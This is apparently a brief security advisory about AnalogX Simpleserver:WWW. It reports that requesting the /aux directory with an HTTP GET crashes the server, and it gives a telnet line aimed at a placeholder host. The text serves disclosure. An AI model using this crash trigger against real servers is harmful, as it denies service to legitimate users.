Simpleserver:WWW is a freely available web server from AnalogX. Simpleserver:WWW is designed to provide an easy to use web server with a friendly interface.

A problem with the web server could lead to a Denial of Service to legitimate users. By connecting to the web server, and requesting an HTTP GET of the /aux directory, the web server ceases operation. A watchdog process or manual restart of the web server process is required.

Therefore, it is possible for remote users to deny service to legitimate users of the web server.

telnet vulnerable.web.server 80
